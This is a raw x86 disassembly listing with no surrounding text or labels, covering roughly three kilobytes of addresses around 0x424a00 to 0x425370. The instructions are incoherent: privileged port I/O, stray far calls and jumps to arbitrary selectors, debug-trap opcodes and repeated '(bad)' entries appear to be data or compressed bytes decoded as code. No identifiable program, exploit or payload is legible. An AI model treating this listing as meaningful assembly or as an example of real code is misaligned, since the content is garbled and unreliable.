  4249d6:	imul   edi,DWORD PTR [ecx+edx*8+0x7a],0x76
  4249db:	mov    cl,0xfd
  4249dd:	sub    DWORD PTR [esi-0x32],esi
  4249e0:	je     0x424995
  4249e2:	gs leave 
  4249e4:	clc    
  4249e5:	icebp  
  4249e6:	cmp    dl,BYTE PTR [ecx+0xbe93a3e]
  4249ec:	push   eax
  4249ed:	add    eax,0xedf88c80
  4249f2:	xchg   ebx,eax
  4249f3:	shl    BYTE PTR [eax],cl
  4249f5:	sbb    edx,DWORD PTR [eax+0x1ec86b7c]
  4249fb:	cwde   
  4249fc:	leave  
  4249fd:	fsubr  QWORD PTR [edx]
  4249ff:	out    0xb7,al
  424a01:	adc    esp,DWORD PTR [edi]
  424a03:	mov    esp,0xe5d26900
  424a08:	aaa    
  424a09:	mov    esi,0xe13c90d9
  424a0e:	pop    ecx
  424a0f:	xlat   BYTE PTR ds:[ebx]
  424a10:	les    esp,FWORD PTR [ebx+0x23]
  424a13:	mov    dl,0xb2
  424a15:	in     al,dx
  424a16:	jnp    0x424a5d
  424a18:	and    BYTE PTR [ebp+eiz*4-0x735389f9],0x8e
  424a20:	repnz push edx
  424a22:	xchg   ebp,eax
  424a23:	dec    ebx
  424a24:	adc    bl,BYTE PTR [ecx+0x27d73a9]
  424a2a:	xchg   ebx,eax
  424a2b:	sub    al,0x45
  424a2d:	popa   
  424a2e:	test   BYTE PTR [eax+edx*4-0x30],dl
  424a32:	xchg   ecx,eax
  424a33:	fsubr  QWORD PTR [ebx]
  424a35:	aas    
  424a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a37:	shl    DWORD PTR [esi+0x7c],cl
  424a3a:	dec    esi
  424a3b:	pop    esi
  424a3c:	sub    al,0x9d
  424a3e:	add    eax,0xf80bbd8c
  424a43:	loopne 0x4249eb
  424a45:	add    ah,BYTE PTR [ecx]
  424a47:	rol    BYTE PTR [edx+0x72f10b57],0xdd
  424a4e:	les    ebp,FWORD PTR [ecx-0x3c80af38]
  424a54:	mov    ebp,0xfbccef3c
  424a59:	jge    0x424a21
  424a5b:	pop    edi
  424a5c:	mov    edx,0x8cbf24da
  424a61:	out    0x6e,eax
  424a63:	lds    esp,FWORD PTR [ecx+esi*2+0x690c2e63]
  424a6a:	xor    DWORD PTR [eax-0x1b],ecx
  424a6d:	mov    edx,0x70f8f8ef
  424a72:	mov    ebx,0xdd8a2d83
  424a77:	and    al,0x85
  424a79:	pop    ss
  424a7a:	in     al,dx
  424a7b:	adc    eax,0x8b361f63
  424a80:	push   edx
  424a81:	dec    ebp
  424a82:	mov    ch,0x33
  424a84:	jne    0x424a41
  424a86:	gs jbe 0x424a82
  424a89:	sbb    DWORD PTR [ecx],ebx
  424a8b:	push   ds
  424a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a8d:	fisub  DWORD PTR [ebx]
  424a8f:	xor    DWORD PTR [ebp-0x59],edi
  424a92:	push   esp
  424a93:	push   esp
  424a94:	jp     0x424a1e
  424a96:	push   0x6033ca7d
  424a9b:	pop    ebp
  424a9c:	test   al,0x6b
  424a9e:	ret    
  424a9f:	fild   DWORD PTR [ebx+eax*2]
  424aa2:	nop
  424aa3:	nop
  424aa4:	bound  eax,QWORD PTR [eax-0x67]
  424aa7:	push   0x22
  424aa9:	pushf  
  424aaa:	jae    0x424a45
  424aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424aad:	dec    esi
  424aae:	push   ebx
  424aaf:	popf   
  424ab0:	nop
  424ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ab2:	sub    esi,ebx
  424ab4:	xchg   DWORD PTR [eax],eax
	...
  424b16:	push   es
  424b17:	aas    
  424b18:	or     eax,0xb6bb3db9
  424b1d:	mov    edi,0x1cbed53b
  424b22:	add    ch,bh
  424b24:	rcr    BYTE PTR [edi-0x2e],1
  424b27:	xchg   BYTE PTR [ecx],al
  424b29:	add    BYTE PTR [edi],al
  424b2b:	add    DWORD PTR [eax],eax
  424b2d:	add    dh,cl
  424b2f:	sub    DWORD PTR [eax],0xffffffd1
  424b32:	mov    esi,0xfbce3c3e
  424b37:	ja     0x424b3e
  424b39:	adc    DWORD PTR cs:[edx+0x36],esi
  424b3d:	arpl   bp,dx
  424b3f:	fisttp DWORD PTR [ecx]
  424b41:	sub    bl,BYTE PTR [esi]
  424b43:	cmp    eax,0x8a2d82d1
  424b48:	nop
  424b49:	iret   
  424b4a:	sub    al,0x18
  424b4c:	mov    ebx,0x41471970
  424b51:	jno    0x424ada
  424b53:	jp     0x424b0d
  424b55:	xlat   BYTE PTR ds:[ebx]
  424b56:	sbb    BYTE PTR [esi+0x37d5c63d],ch
  424b5c:	add    BYTE PTR [ecx+0x32],al
  424b5f:	cmc    
  424b60:	jne    0x424ae3
  424b62:	xor    ah,dh
  424b64:	mov    ds:0x44764432,eax
  424b69:	jbe    0x424b13
  424b6b:	add    eax,DWORD PTR [ecx-0x7c]
  424b6e:	es dec esi
  424b70:	pop    ss
  424b71:	test   eax,0xe869853f
  424b76:	ins    BYTE PTR es:[edi],dx
  424b77:	xchg   ecx,eax
  424b78:	sti    
  424b79:	ret    
  424b7a:	das    
  424b7b:	mov    ebx,0xb6136a4b
  424b80:	sub    DWORD PTR [ebx+0x3c653c1b],ecx
  424b86:	ins    BYTE PTR es:[edi],dx
  424b87:	push   es
  424b88:	bound  ecx,QWORD PTR [edx]
  424b8a:	sub    DWORD PTR [esi],esi
  424b8c:	sahf   
  424b8d:	(bad)  
  424b8e:	pop    ebx
  424b8f:	mov    edi,0x4ed5ad6b
  424b94:	adc    al,0x76
  424b96:	or     dl,ch
  424b98:	pop    ecx
  424b99:	arpl   WORD PTR [ebp-0x5d3bb0cf],dx
  424b9f:	sbb    al,0x81
  424ba1:	jg     0x424b7f
  424ba3:	mov    bl,0x85
  424ba5:	hlt    
  424ba6:	enter  0x2e74,0x57
  424baa:	xchg   edx,eax
  424bab:	mov    edi,DWORD PTR [eax+edx*4]
  424bae:	out    0xf,eax
  424bb0:	sahf   
  424bb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bb2:	fistp  WORD PTR [ebx]
  424bb4:	push   0xffffffa1
  424bb6:	and    al,0xbc
  424bb8:	or     BYTE PTR [ebp-0x737c4af5],cl
  424bbe:	adc    al,0xe4
  424bc0:	inc    edi
  424bc1:	mov    dl,0x22
  424bc3:	jp     0x424b8c
  424bc5:	add    BYTE PTR [ecx+0x58],0x6e
  424bc9:	inc    ecx
  424bca:	push   0x219596e2
  424bcf:	lods   eax,DWORD PTR ds:[esi]
  424bd1:	dec    esp
  424bd2:	push   cs
  424bd3:	fstp   st(1)
  424bd5:	jl     0x424c0b
  424bd7:	(bad)  
  424bd8:	cwde   
  424bd9:	lds    edi,FWORD PTR [esi+ecx*8+0x75]
  424bdd:	push   cs
  424bde:	ret    
  424bdf:	adc    BYTE PTR [ebp-0x32],ch
  424be2:	xchg   edx,eax
  424be3:	addr16 pop es
  424be5:	jge    0x424bac
  424be7:	adc    al,0x32
  424be9:	shr    al,0x78
  424bec:	jg     0x424c37
  424bee:	dec    edi
  424bef:	loop   0x424be9
  424bf1:	lahf   
  424bf2:	and    DWORD PTR [esp+edx*2+0x305b57f9],eax
  424bf9:	dec    edx
  424bfa:	lds    ebx,FWORD PTR [esi-0x1ebebba9]
  424c00:	cmp    ch,BYTE PTR [ebp-0x42]
  424c03:	dec    edi
  424c04:	int    0xd0
  424c06:	sbb    BYTE PTR [eax+ebx*1+0x15a403ae],dh
  424c0d:	dec    esi
  424c0e:	cmovns eax,DWORD PTR ds:[edi]
  424c12:	inc    esi
  424c13:	inc    edi
  424c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c15:	sti    
  424c16:	push   es
  424c17:	lods   eax,DWORD PTR ds:[esi]
  424c18:	jmp    0x4767d2b1
  424c1d:	aam    0xd9
  424c1f:	cmc    
  424c20:	icebp  
  424c21:	icebp  
  424c22:	call   0xe257:0x35b090c2
  424c29:	leave  
  424c2a:	sbb    ch,BYTE PTR [edi+0x438e1015]
  424c30:	daa    
  424c31:	(bad)  
  424c32:	int    0xdb
  424c34:	mov    eax,DWORD PTR [eax]
	...
  424c96:	ins    BYTE PTR es:[edi],dx
  424c97:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424c9e:	sub    eax,0xf8588c09
  424ca3:	adc    eax,0x87d9376e
  424ca8:	add    DWORD PTR [eax],eax
  424caa:	pop    es
  424cab:	add    DWORD PTR [eax],eax
  424cad:	add    BYTE PTR [ebp-0x45a26eac],ah
  424cb3:	(bad)  
  424cb4:	add    al,BYTE PTR [ebx+0x4b]
  424cb7:	(bad)  
  424cb8:	push   ss
  424cb9:	mov    ebx,0xf0e055de
  424cbe:	outs   dx,DWORD PTR ds:[esi]
  424cbf:	out    0x13,al
  424cc1:	sar    ch,0xa8
  424cc4:	jp     0x424cc2
  424cc6:	push   esi
  424cc7:	and    dh,BYTE PTR [edx-0x2e812389]
  424ccd:	cdq    
  424cce:	lock inc ecx
  424cd0:	and    ch,bl
  424cd2:	outs   dx,BYTE PTR ds:[esi]
  424cd3:	fmul   QWORD PTR [edi+0x42]
  424cd6:	mov    esi,0xbd925399
  424cdb:	pushf  
  424cdc:	mov    edx,0xabb4956a
  424ce1:	pop    ebx
  424ce2:	call   FWORD PTR [edi+0x5c]
  424ce5:	mov    eax,ds:0xc708f173
  424cea:	push   0xffffff81
  424cec:	mov    BYTE PTR [eax+edx*8+0x44],bh
  424cf0:	mov    eax,ds:0x28e6b10d
  424cf5:	lds    eax,FWORD PTR [ebx]
  424cf7:	imul   esi,DWORD PTR [edx-0x52ec150e],0x7dd6b71d
  424d01:	sbb    ecx,ecx
  424d03:	mov    cs,ecx
  424d05:	ss mov ecx,0xe622f39e
  424d0b:	test   BYTE PTR [esi],cl
  424d0d:	adc    al,bh
  424d0f:	mov    bh,0xc5
  424d11:	dec    ebp
  424d12:	cwde   
  424d13:	mov    bl,0x77
  424d15:	popf   
  424d16:	(bad)  
  424d18:	xchg   esp,eax
  424d19:	dec    ebp
  424d1a:	aaa    
  424d1b:	pop    eax
  424d1c:	dec    ecx
  424d1d:	jecxz  0x424d08
  424d1f:	sahf   
  424d20:	push   cs
  424d21:	les    ebx,FWORD PTR [edi-0xbe20ece]
  424d27:	adc    edi,edx
  424d29:	in     al,0x92
  424d2b:	xchg   ecx,eax
  424d2c:	addr16 pop ds
  424d2e:	pop    ss
  424d2f:	js     0x424cb4
  424d31:	push   esp
  424d32:	ins    BYTE PTR es:[edi],dx
  424d33:	retf   
  424d34:	jns    0x424dab
  424d36:	xor    BYTE PTR [eax],0xdd
  424d39:	and    cl,BYTE PTR [edx-0x5f]
  424d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d3d:	int    0x0
  424d3f:	pop    ecx
  424d40:	fdiv   QWORD PTR ds:[eax]
  424d43:	xchg   esi,eax
  424d44:	in     eax,dx
  424d45:	add    BYTE PTR [esp+0x7b],bh
  424d49:	xchg   ebp,eax
  424d4a:	lock inc edi
  424d4c:	dec    esi
  424d4d:	arpl   WORD PTR [ecx],di
  424d4f:	jno    0x424cf4
  424d51:	iret   
  424d52:	sbb    bh,dh
  424d54:	lods   al,BYTE PTR ds:[esi]
  424d55:	dec    eax
  424d56:	scas   al,BYTE PTR es:[edi]
  424d57:	adc    BYTE PTR [eax+ebp*1],ch
  424d5a:	dec    esi
  424d5b:	push   0xffffffc8
  424d5d:	xchg   DWORD PTR [ecx],ecx
  424d5f:	xchg   esp,eax
  424d60:	jbe    0x424db1
  424d62:	loopne 0x424d51
  424d64:	mov    bh,0xad
  424d66:	aad    0x1a
  424d68:	add    BYTE PTR [edi-0xa],cl
  424d6b:	push   ecx
  424d6c:	mov    bl,BYTE PTR [ebx+0x2b1325f0]
  424d72:	out    dx,al
  424d73:	stos   DWORD PTR es:[edi],eax
  424d74:	adc    dl,BYTE PTR [esi]
  424d76:	mov    ds:0x4c8679a9,eax
  424d7b:	sti    
  424d7c:	dec    edi
  424d7d:	cmp    BYTE PTR fs:[esi],bh
  424d80:	cmp    esp,DWORD PTR [ecx]
  424d82:	jno    0x424d23
  424d84:	sub    al,0x53
  424d86:	mov    gs,WORD PTR [ebx-0x6f]
  424d89:	xor    DWORD PTR [ebp-0x2ebb9c2],esp
  424d8f:	mov    bl,0x8d
  424d91:	bound  edi,QWORD PTR [edi+0x13]
  424d94:	popf   
  424d95:	popa   
  424d96:	das    
  424d97:	enter  0xbf70,0x8c
  424d9b:	pop    cx
  424d9d:	(bad)  
  424d9e:	outs   dx,BYTE PTR ds:[esi]
  424d9f:	imul   ebp,DWORD PTR [eax-0x21a54426],0x43
  424da6:	sbb    cl,BYTE PTR [ecx+0x75]
  424da9:	sub    al,ah
  424dab:	cwde   
  424dac:	adc    eax,0xcc8693d9
  424db1:	adc    esp,DWORD PTR [esi+0xe002]
	...
  424e13:	add    BYTE PTR [eax],al
  424e15:	add    BYTE PTR ds:0xf361d20c,bh
  424e1b:	(bad)  
  424e1c:	mov    edi,0xb8b3635c
  424e21:	xchg   DWORD PTR [ebx],ebx
  424e23:	hlt    
  424e24:	retf   0xe07a
  424e27:	mov    BYTE PTR [ecx],al
  424e29:	add    BYTE PTR [edi],al
  424e2b:	add    DWORD PTR [eax],eax
  424e2d:	add    BYTE PTR [edx+0x7d],al
  424e30:	cmc    
  424e31:	sbb    ebp,DWORD PTR ss:[ebx-0x61696ab6]
  424e38:	xchg   esp,eax
  424e39:	cwde   
  424e3a:	fcmovb st,st(4)
  424e3c:	call   0x48d3:0x839f782c
  424e43:	push   ss
  424e44:	dec    eax
  424e45:	push   esp
  424e46:	inc    edx
  424e47:	cmp    al,0x99
  424e49:	into   
  424e4a:	xor    ah,bh
  424e4c:	mov    fs:0xc98ba7bf,eax
  424e52:	clc    
  424e53:	sbb    ebx,DWORD PTR [eax+0x3]
  424e56:	loopne 0x424e21
  424e58:	mov    ds:0x76399a63,eax
  424e5d:	in     eax,dx
  424e5e:	xlat   BYTE PTR ds:[ebx]
  424e5f:	adc    ecx,DWORD PTR [eax]
  424e61:	mov    ch,0xda
  424e63:	daa    
  424e64:	push   ebx
  424e65:	enter  0x9742,0x6a
  424e69:	mov    bh,0x2a
  424e6b:	mov    dl,0xd1
  424e6d:	xor    esp,ebx
  424e6f:	pushf  
  424e70:	or     esp,DWORD PTR [ecx-0x2ab3a163]
  424e76:	stos   DWORD PTR es:[edi],eax
  424e77:	stos   BYTE PTR es:[edi],al
  424e78:	push   edi
  424e79:	mov    eax,ds:0xe00f0eb3
  424e7e:	in     eax,dx
  424e7f:	mov    esi,0xf9f27969
  424e84:	dec    ebp
  424e85:	fld    DWORD PTR [eiz*4-0xaaca081]
  424e8c:	popf   
  424e8d:	xor    bl,BYTE PTR [edx+esi*8+0x58317fbf]
  424e94:	mov    ebx,0x59727fa7
  424e99:	sub    DWORD PTR [edi+0x61],esp
  424e9c:	je     0x424e3a
  424e9e:	dec    ecx
  424e9f:	lods   eax,DWORD PTR ds:[esi]
  424ea0:	inc    esp
  424ea1:	cmp    ah,BYTE PTR [ebp+0x21]
  424ea4:	sub    edi,DWORD PTR [ebx+0xa]
  424ea7:	ins    BYTE PTR es:[edi],dx
  424ea8:	xlat   BYTE PTR ds:[ebx]
  424ea9:	add    al,0x9b
  424eab:	loope  0x424e4a
  424ead:	lds    edx,FWORD PTR ds:0x9a861f76
  424eb3:	loope  0x424ec7
  424eb5:	lahf   
  424eb6:	(bad)  
  424eb7:	aad    0x7b
  424eb9:	rol    BYTE PTR [esp+esi*2-0x16],0x5c
  424ebe:	dec    bl
  424ec0:	or     edi,DWORD PTR [edx-0x68]
  424ec3:	mov    ?,WORD PTR [esi-0x59]
  424ec6:	adc    BYTE PTR [ecx+0x5584d15b],bh
  424ecc:	int    0x77
  424ece:	test   DWORD PTR [esp+edx*2+0x3789e00],ebp
  424ed5:	push   esi
  424ed6:	stos   BYTE PTR es:[edi],al
  424ed7:	pop    edi
  424ed8:	mov    ds:0xd6a1f398,eax
  424edd:	scas   al,BYTE PTR es:[edi]
  424ede:	add    BYTE PTR [edi+0x51],dl
  424ee1:	mov    esi,0x70c80a4a
  424ee6:	push   0xfffffff3
  424ee8:	push   ecx
  424ee9:	xchg   edi,eax
  424eea:	rcl    esp,1
  424eec:	xchg   esp,eax
  424eed:	adc    esp,ecx
  424eef:	dec    ebp
  424ef0:	cs pop edi
  424ef2:	or     DWORD PTR [edx-0x4ca1ab22],edx
  424ef8:	mov    WORD PTR [edx+0x1f48e479],?
  424efe:	(bad)  
  424eff:	loope  0x424efc
  424f01:	icebp  
  424f02:	(bad)  
  424f04:	xchg   esp,eax
  424f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f06:	les    esp,FWORD PTR [ecx]
  424f08:	dec    si
  424f0a:	sub    bh,BYTE PTR [edi-0x1d]
  424f0d:	inc    esp
  424f0e:	push   ds
  424f0f:	inc    esp
  424f10:	or     al,0x5d
  424f12:	ret    0xc747
  424f15:	scas   al,BYTE PTR es:[edi]
  424f16:	or     BYTE PTR ds:0x420aab14,bl
  424f1c:	stc    
  424f1d:	fistp  DWORD PTR [eax-0x1]
  424f20:	push   ebp
  424f21:	imul   eax,DWORD PTR [ebx+0x1e7a908],0x225901f9
  424f2b:	jns    0x424f31
  424f2d:	inc    ebp
  424f2e:	arpl   cx,si
  424f30:	push   ebp
  424f31:	lods   eax,DWORD PTR ds:[esi]
  424f32:	rol    BYTE PTR [eax+0x48],cl
	...
  424f94:	add    BYTE PTR [eax],al
  424f96:	dec    ebx
  424f97:	push   ss
  424f98:	int    0x41
  424f9a:	fstp   st(3)
  424f9c:	iret   
  424f9d:	push   ds
  424f9e:	xor    al,0x88
  424fa0:	ror    BYTE PTR [eax-0x44b61d5d],1
  424fa6:	out    0x89,eax
  424fa8:	add    DWORD PTR [eax],eax
  424faa:	pop    es
  424fab:	add    DWORD PTR [eax],eax
  424fad:	add    BYTE PTR [esp+esi*8],dl
  424fb0:	imul   ecx,DWORD PTR ds:0xa33b365a,0xffffffba
  424fb7:	or     al,BYTE PTR [edi]
  424fb9:	pop    edx
  424fba:	pop    eax
  424fbb:	loope  0x42500e
  424fbd:	test   al,0x3a
  424fbf:	aam    0x30
  424fc1:	pop    esp
  424fc2:	add    cl,0x58
  424fc5:	dec    edi
  424fc6:	fistp  WORD PTR [ecx+0x4422a29a]
  424fcc:	retf   
  424fcd:	sub    BYTE PTR [esi-0x5d137acf],dh
  424fd3:	ss aaa 
  424fd5:	cld    
  424fd6:	lds    esi,FWORD PTR [ebp-0x30f6b33]
  424fdc:	test   bh,0xde
  424fdf:	jns    0x424fe2
  424fe1:	sbb    BYTE PTR [edx-0x28269ef0],dh
  424fe7:	xor    dl,BYTE PTR [esi-0x71c1aa78]
  424fed:	or     al,0xfa
  424fef:	call   0x7b4ce268
  424ff4:	and    DWORD PTR [ebx],ecx
  424ff6:	test   eax,0x31d0ae9e
  424ffb:	push   0x49be5bce
  425000:	icebp  
  425001:	(bad)
  425004:	jne    0x42500f
  425006:	in     al,dx
  425007:	fndisi(8087 only) 
  425009:	imul   ch
  42500b:	out    0xfb,al
  42500d:	dec    esp
  42500e:	pusha  
  42500f:	add    edi,ebp
  425011:	imul   esp,DWORD PTR [ecx-0x5fb7bdd2],0xe05b0f4e
  42501b:	pushf  
  42501c:	add    dh,BYTE PTR [edi+0x4d]
  42501f:	int3   
  425020:	rcr    BYTE PTR [ebx-0x6b6e650e],cl
  425026:	jl     0x424fcb
  425028:	lea    esi,[esi-0x7b95ef98]
  42502e:	mov    ecx,0xbe7b21b1
  425033:	into   
  425034:	call   0xbf22:0x67d9b16b
  42503b:	jle    0x425067
  42503d:	jae    0x4250a0
  42503f:	inc    ecx
  425040:	(bad)  
  425041:	clc    
  425042:	(bad)  
  425043:	and    DWORD PTR ds:0xfc7501ab,0x6537759d
  42504d:	ret    
  42504e:	sub    eax,edx
  425050:	xchg   ebp,eax
  425051:	xchg   ebp,eax
  425052:	icebp  
  425053:	inc    ebp
  425054:	and    al,0x88
  425056:	cmp    DWORD PTR [ebx],ebp
  425058:	outs   dx,DWORD PTR ds:[esi]
  425059:	or     eax,0xd5258221
  42505e:	xor    eax,0x7af6b17f
  425063:	leave  
  425064:	aad    0x35
  425066:	fstp   QWORD PTR [ecx]
  425068:	mov    ?,WORD PTR [edi+ebp*8]
  42506b:	les    esi,FWORD PTR [ebx-0x13]
  42506e:	mov    ds:0x31bab27f,eax
  425073:	sbb    ah,BYTE PTR [edx]
  425075:	cmp    DWORD PTR [ebx+edi*8+0x1a],esi
  425079:	jns    0x4250c4
  42507b:	stos   BYTE PTR es:[edi],al
  42507c:	mov    ecx,0x3ef66b16
  425081:	lar    ecx,WORD PTR [ebx+eax*2+0x1e]
  425086:	mov    esp,0xc00d7764
  42508b:	dec    esi
  42508c:	sbb    al,0x97
  42508e:	in     al,0xb1
  425090:	cli    
  425091:	in     al,dx
  425092:	test   BYTE PTR [edx+0x10],bh
  425095:	mov    ds:0xa85cf050,al
  42509a:	retf   0xfb0
  42509d:	cdq    
  42509e:	sbb    esp,DWORD PTR [esi-0x13ffea9a]
  4250a4:	xchg   DWORD PTR [edi-0x2c],eax
  4250a7:	xchg   edi,eax
  4250a8:	xchg   esp,eax
  4250a9:	jno    0x42503a
  4250ab:	jmp    0x42505a
  4250ad:	jl     0x4250f1
  4250af:	scas   eax,DWORD PTR es:[edi]
  4250b0:	cdq    
  4250b1:	out    0x22,al
  4250b3:	stos   BYTE PTR es:[edi],al
  4250b4:	call   0x0:0x0
	...
  425113:	add    BYTE PTR [eax],al
  425115:	add    dh,bl
  425117:	adc    DWORD PTR [edi-0x15020dd],ebx
  42511d:	std    
  42511e:	and    al,0x47
  425120:	xchg   edi,eax
  425121:	shl    BYTE PTR [edi-0x38],cl
  425124:	stos   DWORD PTR es:[edi],eax
  425125:	(bad)  
  425126:	out    dx,al
  425127:	mov    al,BYTE PTR [ecx]
  425129:	add    BYTE PTR [edi],al
  42512b:	add    DWORD PTR [eax],eax
  42512d:	add    BYTE PTR [edi-0x55],bl
  425130:	cmp    ah,ch
  425132:	(bad)  
  425133:	leave  
  425134:	addr16 cmp dh,cl
  425137:	push   esi
  425138:	push   es
  425139:	idiv   BYTE PTR [esi]
  42513b:	ja     0x42518c
  42513d:	sti    
  42513e:	sti    
  42513f:	(bad)  
  425141:	jb     0x425193
  425143:	daa    
  425144:	jg     0x425162
  425146:	mul    bl
  425148:	sar    DWORD PTR [edi-0x44],0x29
  42514c:	inc    esp
  42514d:	stos   DWORD PTR es:[edi],eax
  42514e:	mov    edx,0x1b0656c0
  425153:	dec    eax
  425154:	jae    0x4251ad
  425156:	out    dx,eax
  425157:	xlat   BYTE PTR ds:[ebx]
  425158:	adc    eax,0xf196b4c9
  42515d:	je     0x4251c7
  42515f:	inc    eax
  425160:	pop    esi
  425161:	sahf   
  425162:	retf   0xcbd8
  425165:	bound  eax,QWORD PTR [ebx]
  425167:	add    BYTE PTR [edi],al
  425169:	sbb    ebp,DWORD PTR [eax+0x42]
  42516c:	cmp    ecx,DWORD PTR [edx+0x25]
  42516f:	pushf  
  425170:	mov    cl,0x38
  425172:	aad    0x27
  425174:	sub    DWORD PTR [edx+0x61263f58],edi
  42517a:	das    
  42517b:	mov    esp,0xe4322e65
  425180:	outs   dx,BYTE PTR ds:[esi]
  425181:	ss (bad) 
  425184:	mov    ch,0xf8
  425186:	inc    ebp
  425187:	sahf   
  425188:	sbb    DWORD PTR [edx+0x4cf76d45],0xfffffffd
  42518f:	xchg   esp,eax
  425190:	sub    DWORD PTR [ecx-0x4130592f],edx
  425196:	or     bh,BYTE PTR [edi+0x5c]
  425199:	js     0x42513a
  42519b:	jae    0x42516f
  42519d:	sbb    DWORD PTR ds:0x5fd8b5b4,esi
  4251a3:	push   ds
  4251a4:	push   esp
  4251a5:	jmp    0xc59f:0xc305c273
  4251ac:	mov    ds:0xf128538b,al
  4251b1:	test   al,0x53
  4251b3:	mov    esp,0x516bc924
  4251b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251b9:	xchg   esi,eax
  4251ba:	std    
  4251bb:	stos   DWORD PTR es:[edi],eax
  4251bc:	pushf  
  4251bd:	xor    al,0x7c
  4251bf:	mov    edi,DWORD PTR [ebx+0x14]
  4251c2:	adc    BYTE PTR [edx-0x4312dc3e],bl
  4251c8:	cmp    DWORD PTR [ebx],ebp
  4251ca:	out    dx,eax
  4251cb:	clc    
  4251cc:	fmul   DWORD PTR [eax]
  4251ce:	retf   
  4251cf:	mov    ch,0xe
  4251d1:	fucomi st,st(7)
  4251d3:	inc    esp
  4251d4:	stos   DWORD PTR es:[edi],eax
  4251d5:	repz adc bh,dh
  4251d8:	xor    DWORD PTR ds:0x43ad2703,ebp
  4251de:	jo     0x42525a
  4251e0:	dec    esi
  4251e1:	jge    0x4251f5
  4251e3:	adc    BYTE PTR [edi+0xa3a36f8],dh
  4251e9:	push   ebp
  4251ea:	or     bl,BYTE PTR [eax+ecx*8]
  4251ed:	xchg   ebx,eax
  4251ee:	push   ds
  4251ef:	and    BYTE PTR [ecx+eiz*4+0x16],al
  4251f3:	leave  
  4251f4:	push   edx
  4251f5:	mov    edi,0x460714d8
  4251fa:	pop    edi
  4251fb:	mov    edx,0x19f9e18f
  425200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425201:	adc    BYTE PTR [ecx],dl
  425203:	in     eax,0x87
  425205:	rcr    DWORD PTR [ebp+0x23],0xb3
  425209:	add    DWORD PTR [ebx],ecx
  42520b:	push   0xd8db04b6
  425210:	int3   
  425211:	inc    edx
  425212:	enter  0xabed,0x53
  425216:	adc    DWORD PTR [ebp-0x5c],ebx
  425219:	or     BYTE PTR [eax-0x25838ae5],dl
  42521f:	in     eax,0xc1
  425221:	pop    edx
  425222:	and    BYTE PTR [edi+edi*4-0x365fd0ae],0xea
  42522a:	in     al,dx
  42522b:	sbb    ah,BYTE PTR [eax+0x6cdfe952]
  425231:	mov    eax,DWORD PTR [esi+0x1773]
	...
  425293:	add    BYTE PTR [eax],al
  425295:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42529c:	mov    ebp,0x2e2083e6
  4252a1:	add    eax,0x1e8b30e4
  4252a6:	cmc    
  4252a7:	mov    eax,DWORD PTR [ecx]
  4252a9:	add    BYTE PTR [edi],al
  4252ab:	add    DWORD PTR [eax],eax
  4252ad:	add    cl,ch
  4252af:	or     BYTE PTR [ecx+0x45],bh
  4252b2:	lods   al,BYTE PTR cs:[esi]
  4252b4:	pop    ds
  4252b5:	push   edx
  4252b6:	imul   eax,DWORD PTR [ebx-0x6dd7c7c6],0x651876aa
  4252c0:	inc    esi
  4252c1:	test   ah,bh
  4252c3:	fsub   DWORD PTR [eax+0x1f]
  4252c6:	mov    ?,WORD PTR [esi]
  4252c8:	push   cs
  4252c9:	mov    DWORD PTR [esi],edi
  4252cb:	dec    edi
  4252cc:	fild   WORD PTR [eax-0x23]
  4252cf:	outs   dx,BYTE PTR ds:[esi]
  4252d0:	add    BYTE PTR [edx],al
  4252d2:	int    0x72
  4252d4:	fiadd  DWORD PTR [eax-0x34]
  4252d7:	pop    eax
  4252d8:	jbe    0x4252b2
  4252da:	pop    ebp
  4252db:	and    edx,esp
  4252dd:	mov    esp,0xe76b2e95
  4252e2:	push   0xffffffca
  4252e4:	mov    esp,0x386b0fd0
  4252e9:	mov    ds:0x201c58bd,al
  4252ee:	scas   eax,DWORD PTR es:[edi]
  4252ef:	repz ret 
  4252f1:	add    BYTE PTR [ebx+0x2b7d39c3],dl
  4252f7:	push   eax
  4252f8:	push   0xffffffb1
  4252fa:	add    BYTE PTR [edx+0x32a77f78],dh
  425300:	push   esi
  425301:	mov    cl,0x64
  425303:	cdq    
  425304:	scas   al,BYTE PTR es:[edi]
  425305:	inc    esi
  425306:	inc    eax
  425307:	es sub al,0x7c
  42530a:	scas   eax,DWORD PTR es:[edi]
  42530b:	xchg   ecx,eax
  42530c:	rol    DWORD PTR [eax],0x9a
  42530f:	rcl    DWORD PTR [edi],1
  425311:	pop    ebx
  425312:	inc    ebx
  425313:	es aaa 
  425315:	xor    al,0x3d
  425317:	xor    eax,0xf477210a
  42531c:	sti    
  42531d:	mov    eax,DWORD PTR [ebx-0x37e80591]
  425323:	mov    BYTE PTR [edx],ch
  425325:	inc    ebp
  425326:	jns    0x42533f
  425328:	ins    BYTE PTR es:[edi],dx
  425329:	lahf   
  42532a:	push   edi
  42532b:	fcmovnbe st,st(2)
  42532d:	push   ecx
  42532e:	cmp    dl,BYTE PTR [edx]
  425330:	jns    0x4253a1
  425332:	mov    esi,0xf6a16210
  425337:	(bad)  
  425338:	pop    esp
  425339:	(bad)  
  42533a:	fwait
  42533b:	dec    ecx
  42533c:	call   0x30811163
  425341:	jl     0x42533b
  425343:	adc    cl,BYTE PTR [eax+ebx*1-0x60]
  425347:	pop    esi
  425348:	push   ecx
  425349:	or     al,0x59
  42534b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42534c:	outs   dx,BYTE PTR ds:[esi]
  42534d:	and    eax,0xe696c5b3
  425352:	in     eax,dx
  425353:	and    esi,eax
  425355:	and    al,0xd0
  425357:	scas   al,BYTE PTR es:[edi]
  425358:	add    edi,DWORD PTR [ebx-0x68]
  42535b:	and    ebx,DWORD PTR [edx-0x75]
  42535e:	add    DWORD PTR [ebx-0x7c],0x78
  425362:	cmp    cl,dh
  425364:	cmp    al,0xa4
  425366:	jmp    0xf367:0x15b8555e
  42536d:	dec    ebx
